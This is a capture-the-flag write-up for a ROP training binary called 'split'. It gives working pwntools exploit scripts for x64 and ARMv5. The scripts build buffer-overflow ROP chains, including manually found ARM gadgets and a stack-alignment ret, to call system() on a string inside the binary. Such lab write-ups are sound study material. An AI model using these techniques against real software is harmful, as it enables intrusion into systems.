## x64
---
- Basic `pop rdi; ret` ROP chain but with another stack alignment before the `system` syscall
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./split"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

offset = 40

rop = ROP(exe)
rop.raw(rop.rdi.address)
rop.raw(elf.sym.usefulString)
rop.raw(rop.ret.address)
rop.raw(elf.sym.system)

payload = flat({offset: rop.chain()})

context.log_level = "debug"
io = process(exe)
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5
---
- Unfortunately, pwntools' `ROP()` doesn't seem to work for `ARMv5` but that's okay since we're finding the gadgets manually anyway
- The biggest difference it seems between `armel` and `x86` is that `armel` does a lot of `pop`ping into the `pc`, allowing us to teleport around
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./split_armv5"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

# 0x000103a4: pop {r3, pc};
# 0x00010558: mov r0, r3; pop {fp, pc};
pop_r3_pc = 0x103a4
mov_r0_r3_pop_fp_pc = 0x10558
cat_flag = next(elf.search(b"cat flag"))

payload = b""
payload += p32(pop_r3_pc)
payload += p32(cat_flag)
payload += p32(mov_r0_r3_pop_fp_pc)
payload += p32(0) # fill fp
payload += p32(elf.sym.system) # pc = system("/bin/cat flag...")

offset = 36
payload = flat({offset: payload})

context.log_level = "debug"
io = gdb.debug(exe, "b *0x105c4\nc")
io.sendafter(b"> ", payload)
io.interactive()
```
